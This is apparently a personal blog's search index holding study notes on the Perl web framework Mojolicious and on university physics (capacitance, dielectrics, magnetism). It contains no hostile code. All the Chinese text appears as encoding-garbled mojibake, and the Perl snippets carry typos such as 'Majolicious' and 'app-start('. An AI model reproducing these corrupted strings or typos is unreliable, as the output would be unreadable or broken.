<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Mojolicious-å­¦ä¹ </title>
    <link href="/2023/02/11/Mojolicious-%E5%AD%A6%E4%B9%A0/"/>
    <url>/2023/02/11/Mojolicious-%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<p><a href="https://docs.mojolicious.org/Mojolicious/Guides/Tutorial">å‚è€ƒå®˜æ–¹æ•™ç¨‹</a></p><h1 id="Hello-World"><a href="#Hello-World" class="headerlink" title="Hello World"></a>Hello World</h1><p>ä½¿ç”¨ <code>use Majolicious::Lite -signatures;</code> æ—¶, å°±å·²ç»å¯¼å…¥äº† <code>strict</code>, <code>warnings</code>, <code>utf8</code>, å’Œ <code>5.16</code> çš„ <code>features</code></p><p>ç”Ÿæˆç¤ºä¾‹ä»£ç çš„å‘½ä»¤:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ mojo generate lite-app myapp.pl<br></code></pre></td></tr></table></figure><h1 id="Commands"><a href="#Commands" class="headerlink" title="Commands"></a>Commands</h1><p>è„šæœ¬ä¸­çš„:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-comment"># ç”¨ @ARGV ä½œä¸ºå…¶å‚æ•°</span><br>app-&gt;start;<br><br><span class="hljs-comment"># è‡ªå·±ä¼ å…¥å‚æ•°</span><br>app-start(<span class="hljs-string">&#x27;deamon&#x27;</span>, <span class="hljs-string">&#x27;-l&#x27;</span>, <span class="hljs-string">&#x27;http://*:8080&#x27;</span>);<br></code></pre></td></tr></table></figure><p>åº”è¯¥æ”¾åœ¨ä»£ç çš„æœ€å. ç”¨æ¥å¯åŠ¨ Mojolicious.</p><h1 id="Reloading"><a href="#Reloading" class="headerlink" title="Reloading"></a>Reloading</h1><p>å¦‚æœç”¨ <code>morbo</code> å‘½ä»¤åŠ è½½æ–‡ä»¶, Web Server å°±å¯ä»¥çƒ­å¯åŠ¨, å³, ä½ ä¿®æ”¹äº†è„šæœ¬æ–‡ä»¶å, ä¸éœ€è¦ç”¨ <code>Ctrl+C</code> æˆ– <code>kill</code> æš‚åœç¨‹åº, å…¶è‡ªåŠ¨å°±ä¼šåŠ è½½æ–°çš„å†…å®¹.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ morbo ./myapp.pl<br></code></pre></td></tr></table></figure><h1 id="Routes"><a href="#Routes" class="headerlink" title="Routes"></a>Routes</h1><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> Mojolicious::Lite -signatures;<br><br><span class="hljs-comment"># Route leading to an action that renders some text</span><br>get <span class="hljs-string">&#x27;/foo&#x27;</span> =&gt; <span class="hljs-function"><span class="hljs-keyword">sub</span> ($<span class="hljs-title">c</span>) </span>&#123;<br>  $c-&gt;render(<span class="hljs-string">text =&gt;</span> <span class="hljs-string">&#x27;Hello World!&#x27;</span>);<br>&#125;;<br><br>app-&gt;start;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œçš„ <code>$c</code> æ˜¯ä¸€ä¸ª <code>Majolicious::Controller</code> çš„å¯¹è±¡. å…¶åŒ…å« HTTP çš„ request å’Œ response.</p><h1 id="GET-x2F-POST-parameter"><a href="#GET-x2F-POST-parameter" class="headerlink" title="GET&#x2F;POST parameter"></a>GET&#x2F;POST parameter</h1><p><code>GET</code> å’Œ <code>POST</code> çš„å‚æ•°éƒ½ä¼ é€’ç»™ <code>Mojolicious::Controller</code> ä¸­çš„ <code>param</code> å‡½æ•°</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> Mojolicious::Lite -signatures;<br><br><span class="hljs-comment"># /foo?user=sri</span><br>get <span class="hljs-string">&#x27;/foo&#x27;</span> =&gt; <span class="hljs-function"><span class="hljs-keyword">sub</span> ($<span class="hljs-title">c</span>) </span>&#123;<br>  <span class="hljs-keyword">my</span> $user = $c-&gt;param(<span class="hljs-string">&#x27;user&#x27;</span>);<br>  $c-&gt;render(<span class="hljs-string">text =&gt;</span> <span class="hljs-string">&quot;Hello $user.&quot;</span>);<br>&#125;;<br><br>app-&gt;start;<br></code></pre></td></tr></table></figure><h1 id="Stash-å’Œ-templates"><a href="#Stash-å’Œ-templates" class="headerlink" title="Stash å’Œ templates"></a>Stash å’Œ templates</h1>]]></content>
    
    
    <categories>
      
      <category>Perl</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>å¤§ç‰©IIä¸ŠåŠæœŸ-Notes2</title>
    <link href="/2023/02/10/%E5%A4%A7%E7%89%A9II%E4%B8%8A%E5%8D%8A%E6%9C%9F-Notes2/"/>
    <url>/2023/02/10/%E5%A4%A7%E7%89%A9II%E4%B8%8A%E5%8D%8A%E6%9C%9F-Notes2/</url>
    
    <content type="html"><![CDATA[<h1 id="Chapter-22-Capacitance-Dielectrics-Electric-Energy-Storage"><a href="#Chapter-22-Capacitance-Dielectrics-Electric-Energy-Storage" class="headerlink" title="Chapter 22 Capacitance, Dielectrics, Electric Energy Storage"></a>Chapter 22 Capacitance, Dielectrics, Electric Energy Storage</h1><h2 id="22-1-Capacitors"><a href="#22-1-Capacitors" class="headerlink" title="22.1 Capacitors"></a>22.1 Capacitors</h2><blockquote><p>é‡è¦å…¬å¼</p></blockquote><p>$$<br>\displaylines{C &#x3D; \frac{Q}{V}}<br>$$<br>(C æŒ‡ç”µå®¹é‡, Q æŒ‡ç”µè·é‡, V æŒ‡ç”µåŠ¿å·®)</p><p>A capacitor æœ‰æ—¶ä¹Ÿè¢«ç§°ä¸º condenser, å¯ä»¥å­˜å‚¨ electric charge, å¸¸å¸¸ç”±ä¸¤ä¸ªå¯¼ä½“, æ”¾å¾—æ¥è¿‘ä½†æ˜¯ä¸æ¥è§¦ç»„æˆ.</p><p>éå¸¸å°çš„ capacitors ç”¨æ¥ç”µè„‘ RAM ä¸­å­˜å‚¨ 0 å’Œ 1 çš„äºŒè¿›åˆ¶.</p><p>å¸¸å¸¸ä¸¤ä¸ªæ¿å­å·æˆåœ†æŸ±ä½“, ä¸­é—´å¤¹ç€çº¸æˆ–è€…å…¶ä»– insulator:<br><img src="/../img/capacitor_seperate_by_insulators.png"><br>capacitor çš„ symbol ä¸º:</p><p><img src="/../img/capacitor_symbol.png"></p><p>ä¸èƒ½å°†ç”µæºå’Œç”µå®¹å™¨æ··æ·†. ç”µå®¹å™¨åªæ˜¯å­˜å‚¨ç”µè·çš„ç”µå­å…ƒä»¶.</p><p>å°†ç”µæºå’Œ capacitor è”é€šå¯ä»¥å……ç”µ:<br>$$<br>Q &#x3D; C V_{ab}<br>$$</p><p><img src="/../img/charge_capacitors.png"></p><p>è¿™é‡Œçš„ $C$ å°±æ˜¯ capacitance of the capacitor. å•ä½æ˜¯ $C &#x2F; V$, å³ $F$, a farad.</p><p>$C$ çš„å€¼å–å†³ä¸ capacitor çš„å¤§å°, å½¢çŠ¶, ä¸¤ä¸ªå¯¼ä½“çš„ç›¸å¯¹è·ç¦», ä»¥åŠææ–™.</p><h2 id="22-2-Dtermination-of-Capacitance"><a href="#22-2-Dtermination-of-Capacitance" class="headerlink" title="22.2 Dtermination of Capacitance"></a>22.2 Dtermination of Capacitance</h2><blockquote><p>æœ€ç»ˆå…¬å¼</p></blockquote><p>$$<br>C &#x3D; \frac{Q}{V_{ba}} &#x3D; \epsilon_0 \frac{A}{d}<br>$$</p><blockquote><p>æ¨å¯¼ç”µå®¹é‡å½±å“å› ç´ çš„å…¬å¼</p></blockquote><p>å¾—å‡ºè¿™ä¸ªæ¨å¯¼å¼, ä¸»è¦æ˜¯å¯¹ $C &#x3D; \frac{Q}{V}$ ä¸­çš„ $V$ è¿›è¡Œå˜æ¢. ä¹Ÿå°±æ˜¯ä¼šå½±å“ç”µåŠ¿å·®çš„å› ç´ .</p><p>è¿™é‡Œå‡è®¾ capacitors çš„å½¢çŠ¶ç®€å•, ä¹‹é—´çš„ insulator ä¸ºçœŸç©ºæˆ–ç©ºæ°”, ä¸¤ä¸ª conductor ä¹‹é—´çš„è·ç¦» $d$ å¾ˆçŸ­, æ¯ä¸€ä¸ª plate çš„é¢ç§¯ä¸º A.</p><p>æ ¹æ® $E &#x3D; \frac{\sigma}{\epsilon_0}$ å’Œ $\sigma &#x3D; \frac{Q}{A}$ å¾—åˆ°:<br>$$<br>E &#x3D; \frac{Q}{\epsilon_0 A}<br>$$<br>åˆå› ä¸º:<br>$$<br>V_{ba} &#x3D; - \int_a^b E \cdot dl<br>$$<br>è¿™é‡Œæ˜¯ç‚¹ä¹˜, ä¹Ÿå°±æ˜¯å‘é‡, éœ€è¦çŸ¥é“ E å’Œ $dl$ ä¹‹é—´çš„è§’åº¦, ä»å›¾ä¸Šå¯ä»¥çœ‹å‡º, a -&gt; b çš„æ–¹å‘å’Œ E çš„æ–¹å‘ç›¸å, åˆ™ $\theta &#x3D; 180^\circ$, å³ $\cos 180^\circ &#x3D; -1$:</p><p><img src="/../img/derive_equation_of_capacitance.png"></p><p>åˆ™æœ‰:<br>$$<br>V_{ba} &#x3D; V_b - V_a &#x3D; -\int_a^b E dl \cos 180^\circ &#x3D; +\int_a^b E dl &#x3D; \frac{Q}{\epsilon_0 A} \int_a^b dl &#x3D; \frac{Q d}{\epsilon_0 A}<br>$$</p><p>æœ€ç»ˆ:<br>$$<br>C &#x3D; \frac{Q}{V_{ba}} &#x3D; \epsilon_0 \frac{A}{d}<br>$$</p><h3 id="ä¹ é¢˜-22-1"><a href="#ä¹ é¢˜-22-1" class="headerlink" title="ä¹ é¢˜ 22-1"></a>ä¹ é¢˜ 22-1</h3><p>(a) å·²çŸ¥é¢ç§¯ A å’Œ distance d æ±‚ capacitance. åˆ©ç”¨ $C &#x3D; \epsilon_0 \frac{A}{d}$ è®¡ç®—.</p><p>(b) å·²çŸ¥ C å’Œ V è®¡ç®— Q.</p><p>(c) å·²çŸ¥ Q è®¡ç®— E.</p><h3 id="ä¹ é¢˜-22-2"><a href="#ä¹ é¢˜-22-2" class="headerlink" title="ä¹ é¢˜ 22-2"></a>ä¹ é¢˜ 22-2</h3><p>è¿™é“é¢˜æ˜¯è®©æˆ‘ä»¬æ¨å¯¼å‡ºä¸€ä¸ªè®¡ç®— C çš„å…¬å¼, ä¸€ä¸ªé‡ç‚¹åœ¨äºæ±‚ a long wire å¤–çš„ç”µåœº:</p><p><img src="/../img/cylindrical_capacitor.png"></p><p>ä¸‹é¢çš„é‚£ä¸ªæ˜¯æˆªé¢å›¾.</p><p>a long wire å¤–çš„ç”µåœºçš„æ¨å¯¼å¼ä¸º:<br>$$<br>dq &#x3D; \lambda dl<br>$$<br>å½¢æˆçš„ç”µåœº $dE$ ä¸º:<br>$$<br>dE &#x3D; \frac{1}{4 \pi \epsilon_0} \frac{dq}{r^2}<br>$$</p><p><img src="/../img/long_wire_field.png"></p><p>å› ä¸º $E_y &#x3D; 0$ æˆ‘ä»¬å¯ä»¥çŸ¥é“:<br>$$<br>E &#x3D; E_x &#x3D; \int dE \cos \theta<br>$$<br>åˆ $y &#x3D; x \tan \theta$, å…·ä½“çœ‹ä¹¦, çº¦å»ä¸€éƒ¨åˆ†åå°±æœ‰äº†:<br>$$<br>E &#x3D; \frac{1}{2 \pi \epsilon_0} \frac{\lambda}{x}<br>$$</p><h3 id="ä¹ é¢˜-22-3"><a href="#ä¹ é¢˜-22-3" class="headerlink" title="ä¹ é¢˜ 22-3"></a>ä¹ é¢˜ 22-3</h3><p>è¿™é“é¢˜æ˜¯ä¸¤ä¸ªåŒå¿ƒçƒ, å›¾åƒåŒæ ·æ˜¯æˆªé¢å›¾:</p><p><img src="/../img/spherical_capacitor.png"></p><p>ä¸»è¦è¿˜æ˜¯å…ˆæ±‚ç”µåœº, ç„¶åå†åˆ©ç”¨ $V_{ab} &#x3D; -\int E \cdot dl$ æ¥æ±‚ç”µåŠ¿.</p><p>è¿™é‡Œæ±‚ç”µåœºç”¨çš„æ˜¯é«˜æ–¯å®šç†. å…¶ç®—å‡º, the electric field outside a uniformly charged conducting sphere is $E &#x3D; \frac{Q}{4 \pi \epsilon_0 r^2}$.</p><p>åªæœ‰ä¸€å±‚ conductor çš„ä¹Ÿå¯ä»¥è®¡ç®— capacitance, åªä¸è¿‡å‡è®¾ä¸å¦ä¸€å±‚çš„è·ç¦»ä¸º $\infty$. ä½†å…¶ä¸èƒ½è¢«è§†ä½œæ˜¯ capacitor.</p><h2 id="22-3-Capacitors-in-Series-and-Parallel"><a href="#22-3-Capacitors-in-Series-and-Parallel" class="headerlink" title="22.3 Capacitors in Series and Parallel"></a>22.3 Capacitors in Series and Parallel</h2><blockquote><p>æœ€ç»ˆå…¬å¼</p></blockquote><blockquote><p>å¹¶è”:</p></blockquote><p>$$<br>C_{eq} &#x3D; C_1 + C_2 + C_3<br>$$</p><blockquote><p>ä¸²è”:</p></blockquote><p>$$<br>\frac{1}{C_{eq}} &#x3D; \frac{1}{C_1} + \frac{1}{c_2} + \frac{1}{C_3}<br>$$</p><p>ä¸»è¦æ˜¯å°†å¹¶è”å’Œä¸²è”çš„ capacitors è½¬æ¢æˆç­‰æ•ˆçš„ä¸€ä¸ª capacitor.</p><p><mark>capacitors å¹¶è”</mark> :</p><p><img src="/../img/capacitor_parallel.png"></p><p>ç”±äº capacitors çš„æ­£ææ¿çš„ç”µåŠ¿ç›¸ç­‰:<br>$$<br>Q &#x3D; Q_1 + Q_2 + Q_3 &#x3D; C_1V + C_2V + C_3V<br>$$<br>åˆæœ‰:<br>$$<br>Q &#x3D; C_{eq} V<br>$$<br>åˆ™:<br>$$<br>C_{eq} V &#x3D; (C_1 + C_2 + C_3)V<br>$$<br>å¾—åˆ°:<br>$$<br>C_{eq} &#x3D; C_1 + C_2 + C_3<br>$$</p><p><mark>capacitors ä¸²è”</mark>:</p><p><img src="/../img/capacitor_serial.png"></p><p>åˆ©ç”¨æ¯ä¸€ä¸ª capacitor çš„ Q ç›¸åŒå¾—å‡º:<br>$$<br>\frac{1}{C_{eq}} &#x3D; \frac{1}{C_1} + \frac{1}{c_2} + \frac{1}{C_3}<br>$$<br>ä¸²è”ä¹‹å, C_{eq} æ¯”ä»»ä½•ä¸€ä¸ªä¸²è”çš„ capacitor éƒ½è¦å°.</p><h3 id="ä¹ é¢˜-22-6"><a href="#ä¹ é¢˜-22-6" class="headerlink" title="ä¹ é¢˜ 22-6"></a>ä¹ é¢˜ 22-6</h3><p>å½“ä¸¤ä¸ª capacitor å……å¥½ç”µä¹‹å, å°†è¿™ä¸¤ä¸ª capacitor ç›¸è¿, åªä¸è¿‡æ˜¯ä¸€ä¸ªçš„æ­£ææ¿æ¥å¦ä¸€ä¸ªçš„è´Ÿææ¿, æ±‚ $q_1$ å’Œ $q_2$ çš„å€¼:</p><p><img src="/../img/connect_two_capacitor.png"></p><blockquote><p>è§£é¢˜</p></blockquote><p>åˆ‡å…¥ç‚¹æ˜¯ $V^\prime$ ç›¸ç­‰, å·²çŸ¥ $C_1$ å’Œ $C_2$:<br>$$<br>\displaylines{q_1 &#x3D; C_1 V^\prime \newline~ q_2 &#x3D; C_2 V^\prime \newline~ q_1 + q_2 &#x3D; Q_1 - Q_2 \newline~ V^\prime &#x3D; \frac{q_1 + q_2}{C_1 + C_2}}<br>$$<br>ç„¶åæŠŠ $V^\prime$ å¸¦å›å³å¯.</p><h2 id="22-4-ç”µèƒ½å­˜å‚¨-Electric-Energy-Storage"><a href="#22-4-ç”µèƒ½å­˜å‚¨-Electric-Energy-Storage" class="headerlink" title="22.4 ç”µèƒ½å­˜å‚¨ Electric Energy Storage"></a>22.4 ç”µèƒ½å­˜å‚¨ Electric Energy Storage</h2><blockquote><p>æœ€ç»ˆå…¬å¼</p></blockquote><p>$$<br>\displaylines{U &#x3D; \frac{1}{2} C V^2}<br>$$</p><p><img src="/../img/electron_move_through_capacitor.png"><br>å­˜å‚¨åœ¨ capacitor ä¸­çš„èƒ½é‡å’Œç”¨æ¥ charge å®ƒæ‰€åšçš„åŠŸçš„ä¸€æ ·å¤š.</p><p>ç»™ä¸€ä¸ª capacitor å……ç”µå°±æ˜¯å°†ç”µå­ä»ä¸€ä¸ªææ¿ç§»åŠ¨åˆ°å¦ä¸€ä¸ªææ¿.</p><p>capacitor ä¸æ˜¯ç¬é—´å……å¥½ç”µï¼Œéœ€è¦ä¸€å®šçš„æ—¶é—´.</p><p>ä» $C &#x3D; \frac{Q}{V}$ å¯ä»¥çœ‹å‡ºï¼Œä¸€ä¸ªææ¿ä¸Šçš„ $Q$ è¶Šå¤§ï¼Œå°†ä¸€ä¸ªç”µå­ä¸€åˆ°ææ¿å¦ä¸€ä¾§æ‰€éœ€çš„èƒ½é‡ $V$ ä¹Ÿå°±è¶Šå¤§ (æ¯•ç«Ÿ $C$ æ˜¯å¸¸æ•°ï¼Œå’Œ $Q$ï¼Œ$V$ æ— å…³)</p><blockquote><p>èƒ½é‡å…¬å¼æ¨å¯¼</p></blockquote><p>$$<br>\displaylines{dW &#x3D; V dq \newline~ V &#x3D; \frac{q}{C} \newline~ W &#x3D; \int V dq &#x3D; \frac{1}{C} \int q dq &#x3D; \frac{1}{2} \frac{Q^2}{C} \newline~ U &#x3D; \frac{1}{2} \frac{Q^2}{C} \newline~ Q &#x3D; CV \newline~ U &#x3D; \frac{1}{2} \frac{Q^2}{C} &#x3D; \frac{1}{2}CV^2\newline~}<br>$$</p><h3 id="å°†èƒ½é‡å­˜å‚¨åœ¨ç”µå®¹ä¸­è§†ä¸ºå­˜å‚¨åœ¨ç”µåœºä¸­"><a href="#å°†èƒ½é‡å­˜å‚¨åœ¨ç”µå®¹ä¸­è§†ä¸ºå­˜å‚¨åœ¨ç”µåœºä¸­" class="headerlink" title="å°†èƒ½é‡å­˜å‚¨åœ¨ç”µå®¹ä¸­è§†ä¸ºå­˜å‚¨åœ¨ç”µåœºä¸­"></a>å°†èƒ½é‡å­˜å‚¨åœ¨ç”µå®¹ä¸­è§†ä¸ºå­˜å‚¨åœ¨ç”µåœºä¸­</h3><p>æ›´å¥½çš„ç†è§£èƒ½é‡å­˜å‚¨åœ¨ç”µå®¹ä¸­æ˜¯å°†å…¶çœ‹ä½œå­˜å‚¨åœ¨ç”µåœºä¸­.</p><blockquote><p>å…¬å¼æ¨å¯¼</p></blockquote><p>$$<br>\displaylines{V &#x3D; Ed \newline~ C &#x3D; \frac{\epsilon_0A}{d} \newline~ U &#x3D; \frac{1}{2}CV^2 &#x3D;\frac{1}{2} \frac{\epsilon_0A}{d} E^2 d^2 &#x3D; \frac{1}{2} \epsilon_0 E^2 A d \newline~}<br>$$<br>$A$ æ˜¯é¢ç§¯ï¼Œ$d$ æ˜¯ææ¿é—´çš„è·ç¦»ï¼Œå› æ­¤ $Ad$ å¯ä»¥çœ‹ä½œä½“ç§¯. é™¤å¼€ä½“ç§¯ä¹‹åå¾—åˆ°çš„å°±æ˜¯èƒ½é‡å¯†åº¦:<br>$$<br>u &#x3D; energy_density &#x3D; \frac{1}{2} \epsilon_0 E^2<br>$$<br>è¿™é‡Œçš„ $\epsilon_0A$ æ˜¯çœŸç©ºä¸‹çš„ä»‹ç”µå¸¸æ•°.</p><h2 id="22-5-ç”µä»‹è´¨-Dielectrics"><a href="#22-5-ç”µä»‹è´¨-Dielectrics" class="headerlink" title="22-5 ç”µä»‹è´¨ Dielectrics"></a>22-5 ç”µä»‹è´¨ Dielectrics</h2><p>Dielectrics æŒ‡çš„æ˜¯ capacitor ä¸­é—´çš„å¡«å……ç‰©.</p><p>Dielectrics ä¼šå½±å“ capacitance çš„å¤§å°ï¼Œå½±å“çš„ç¨‹åº¦ä¸ºå¸¸æ•° $K$ è¡¨ç¤º, $\epsilon$ æ˜¯å¼•å…¥çš„æ–°çš„ quantity, æˆä¸ºç‰©è´¨çš„ permittivity (ç”µä»‹å¸¸æ•°ï¼Œä¹Ÿå°±æ˜¯ç”µä»‹è´¨çš„å¸¸æ•°), è€Œ $\epsilon_0$ æ˜¯ç”µä»‹è´¨ä¸ºçœŸç©ºæ—¶çš„ç”µä»‹å¸¸æ•°.</p><p><mark>ä»‹ç”µå¸¸æ•°æ˜¯ä¸€ä¸ªç›¸å¯¹å€¼ï¼Œä»¥çœŸç©ºä¸­ä¸ºåŸºå‡†ï¼Œæ˜¯1</mark> .<br>$$<br>\displaylines{C &#x3D; K C_0 \newline~ C_0 &#x3D; \epsilon_0 \frac{A}{d} \newline~ C &#x3D; K \epsilon_0 \frac{A}{d} \newline~ \epsilon &#x3D; K \epsilon_0 \newline~ C &#x3D; \epsilon \frac{A}{d}}<br>$$<br>$C_0$ æ˜¯å½“å¡«å……ç‰©ä¸ºçœŸç©ºæ—¶çš„ capacitance. </p><blockquote><p>ç”±äºç”µå®¹ $C$ çš„å˜åŒ–è€Œå¯¼è‡´å…¶ä»–ç‰©ç†é‡çš„å˜åŒ–ä¸º, åŸæœ‰çš„é‡ä¸º $C_0$, $Q_0$, $V_0$, $E_0$</p></blockquote><blockquote><ol><li>V ä¸å˜, Qçš„å˜åŒ–</li></ol></blockquote><p>$$<br>\displaylines{C &#x3D; \frac{Q}{V} \newline~ C &#x3D; K C_0 \newline~ Q &#x3D; K Q_0}<br>$$</p><blockquote><ol start="2"><li>Q ä¸å˜, V çš„å˜åŒ–</li></ol></blockquote><p>$$<br>\displaylines{C &#x3D; \frac{Q}{V} \newline~ C &#x3D; K C_0 \newline~ V &#x3D; \frac{V_0}{K}}<br>$$</p><blockquote><ol start="3"><li>Q ä¸å˜, E çš„å˜åŒ–</li></ol></blockquote><p>$$<br>\displaylines{C &#x3D; \frac{Q}{V} \newline~ C &#x3D; K C_0 \newline~ V &#x3D; \frac{V_0}{K} \newline~ \newline E &#x3D; \frac{V}{d} \newline~ \newline E &#x3D; \frac{V_0}{Kd} &#x3D; \frac{E_0}{K}}<br>$$</p><h2 id="22-6-ä»‹ç”µå¸¸æ•°åˆ†å­å±‚é¢çš„æè¿°-Molecular-Description-of-Dielectrics"><a href="#22-6-ä»‹ç”µå¸¸æ•°åˆ†å­å±‚é¢çš„æè¿°-Molecular-Description-of-Dielectrics" class="headerlink" title="22-6 ä»‹ç”µå¸¸æ•°åˆ†å­å±‚é¢çš„æè¿° Molecular Description of Dielectrics"></a>22-6 ä»‹ç”µå¸¸æ•°åˆ†å­å±‚é¢çš„æè¿° Molecular Description of Dielectrics</h2><p>è§£é‡Šä¸ºä»€ä¹ˆåœ¨ç”µææ¿é—´æ’å…¥ Dielectrics ä¹‹å capacitance ä¼šå¢å¤§ (éƒ½æ˜¯å˜å¤§).</p><p>ä¹¦ä¸Šçš„å››å¹…å›¾:<br><img src="/../img/why_dielectric_change_the_capacitance.png"></p><blockquote><p>è§£æ</p></blockquote><p>å›¾ a æ˜¯æ²¡æœ‰æ”¾å…¥ Dielectrics çš„ç”µåœºç¤ºæ„å›¾. </p><p>å›¾ b æ˜¯æ”¾å…¥äº†ï¼Œç”±äº permanent dipole moment çš„å½±å“ï¼Œç‰©è´¨å†…çš„åˆ†å­ä¸€å¼€å§‹å¹¶ä¸æ˜¯åƒè¿™æ ·æ’åˆ—æ•´é½çš„ï¼Œè€Œå¤–éƒ¨ç”µåœºçš„ä½œç”¨ä½¿å…¶æ•´é½æ’åˆ—ï¼Œè´Ÿææœå‘ææ¿çš„æ­£æ.</p><p>ä»å›¾ c å¯ä»¥çœ‹å‡ºï¼Œéƒ¨åˆ†ç”µåœºçº¿æ²¡æœ‰ç©¿è¿‡ Dielectrics, ä¹Ÿå°±æ˜¯è¯´ç”µåœºçº¿æ•°é‡å‡å°‘ï¼Œç”µåœºå˜å°ï¼Œ</p><p>åŒæ—¶, ä»å›¾ d çœ‹å‡ºï¼Œæ²¡æœ‰ç”µåœºçº¿ç©¿è¿‡çš„éƒ¨åˆ†ï¼Œå…¶å†…éƒ¨å½¢æˆäº†ä¸åŸç”µåœºåå‘çš„ç”µåœºï¼Œè¿™æ˜¯ä¸€ä¸ªæ„Ÿåº”ç”µåœº.</p><p>è¿™é‡Œç”µåœºå‡å°çš„ factor å‡è®¾ä¸º K.</p><blockquote><p>å…¬å¼æ¨å¯¼</p></blockquote><p>$$<br>\displaylines{E &#x3D; \frac{E_0}{K} \newline~ \newline V_0 &#x3D; E_0 d \newline~ \newline V &#x3D; Ed \newline~ \newline V &#x3D; \frac{V_0}{K} \newline~ \newline C &#x3D; K C_0}<br>$$</p><blockquote><p>å…³äºå‡ ä¸ªæ„Ÿåº”é‡ $E_{ind}$, $\sigma_{ind}$, å’Œ $Q_{ind}$ çš„å…¬å¼æ¨å¯¼, $\sigma$ æ˜¯ charge density</p></blockquote><p>$$<br>\displaylines{E &#x3D; E_0 - E_{ind} &#x3D; \frac{E_0}{K} \newline~ \newline E_{ind} &#x3D; E_0(1 - \frac{1}{K}) \newline~ \newline E &#x3D; \frac{\sigma}{\epsilon_0}, E_0 &#x3D; \frac{\sigma_0}{\epsilon_0} \newline~ \newline \sigma_{ind} &#x3D; \sigma(1 - \frac{1}{K}) \newline~ \newline \sigma &#x3D; \frac{Q}{A} \newline~ \newline Q_{ind} &#x3D; Q(1- \frac{1}{K})}<br>$$</p><h1 id="Chapter-23-ç”µæµå’Œç”µé˜»-Electric-Currents-and-Resistance"><a href="#Chapter-23-ç”µæµå’Œç”µé˜»-Electric-Currents-and-Resistance" class="headerlink" title="Chapter 23 ç”µæµå’Œç”µé˜» Electric Currents and Resistance"></a>Chapter 23 ç”µæµå’Œç”µé˜» Electric Currents and Resistance</h1><blockquote><p>ç¯ä¸å‘å…‰çš„è¿‡ç¨‹ </p></blockquote><p>ç§»åŠ¨çš„ç”µå­å’ŒåŸå­å‘ç”Ÿç¢°æ’. å¯¼è‡´ç”µçº¿ä¸­ç”µèƒ½è½¬åŒ–ä¸ºçƒ­èƒ½, ç¯ä¸æ¸©åº¦ä¸Šå‡å‘å…‰ğŸŒŸ.</p><h2 id="23-1-ç”µæ± -The-Electric-Battery"><a href="#23-1-ç”µæ± -The-Electric-Battery" class="headerlink" title="23.1 ç”µæ±  The Electric Battery"></a>23.1 ç”µæ±  The Electric Battery</h2><h1 id="Chapter-25-ç£-Magnetism"><a href="#Chapter-25-ç£-Magnetism" class="headerlink" title="Chapter 25 ç£ Magnetism"></a>Chapter 25 ç£ Magnetism</h1><p>â€œMagnetsâ€ è¿™ä¸€åç§°çš„ç”±æ¥: äººä»¬åœ¨ Asia Minor ä¸‹ä¸€ä¸ªå« Magnesia çš„åœ°æ–¹å‘ç°èƒ½ç›¸äº’å¸å¼•çš„çŸ³å¤´ï¼Œå°±æŠŠè¿™äº›çŸ³å¤´ç”¨å‘ç°åœ°å‘½åä¸º â€œMagnetsâ€</p><h2 id="25-1-ç£å’Œç£åœº-Magnets-and-Magnetic-Field"><a href="#25-1-ç£å’Œç£åœº-Magnets-and-Magnetic-Field" class="headerlink" title="25-1 ç£å’Œç£åœº Magnets and Magnetic Field"></a>25-1 ç£å’Œç£åœº Magnets and Magnetic Field</h2><p>Magnets ä¸€èˆ¬æœ‰ä¸¤ç§å½¢çŠ¶:</p><ul><li>bar, æ¡çŠ¶ </li><li>horseshoe, é©¬è¹„çŠ¶</li></ul><p><img src="/../img/the_square_of_magnets.png"></p><p>å¯¹ Magnets çš„ N æ (North)å’Œ S æ (South) çš„å®šä¹‰:</p><ul><li>æŒ‡å‘åœ°ç†ä¸Šçš„åŒ—æçš„ä¸€ä¾§ç§°ä¸º N æ</li><li>æŒ‡å‘åœ°ç†ä¸Šçš„å—æçš„ä¸€ä¾§ç§°ä¸º S æ</li></ul><p>æš‚æ—¶ä¸å­˜åœ¨åªæœ‰ä¸€ä¸ªç£æçš„ç£é“. ä¸€ä¸ªç£é“åˆ†ä¸ºä¸¤æˆªååŒæ ·ä¼šåŒæ—¶å…·æœ‰ N æå’Œ S æã€‚</p><p>æ¯ä¸ªç‰©ä½“éƒ½æœ‰ç£æ€§ï¼Œä½†æ˜¯å¼ºåº¦ä¸åŒã€‚</p><h3 id="ç£æ€§çš„ç”±æ¥"><a href="#ç£æ€§çš„ç”±æ¥" class="headerlink" title="ç£æ€§çš„ç”±æ¥"></a>ç£æ€§çš„ç”±æ¥</h3><h4 id="å‚è€ƒçŸ¥ä¹1"><a href="#å‚è€ƒçŸ¥ä¹1" class="headerlink" title="å‚è€ƒçŸ¥ä¹1"></a><a href="https://www.zhihu.com/question/38879132/answer/81035171">å‚è€ƒçŸ¥ä¹1</a></h4><p>ç£åœºçš„äº§ç”Ÿå¯ä»¥åˆ†ä¸ºä¸¤ç§:</p><ul><li>è¿åŠ¨ç”µæµ (å˜åŒ–çš„ç”µåœºäº§ç”Ÿç£åœº)</li><li>åŸºæœ¬ç²’å­çš„è‡ªæ—‹</li></ul><p>æ‰€æœ‰ç‰©è´¨éƒ½æœ‰ç£æ€§ï¼Œåªæ˜¯å¤§å°ä¸åŒ.</p><p>æµ…æ˜¾çš„è®¤çŸ¥: 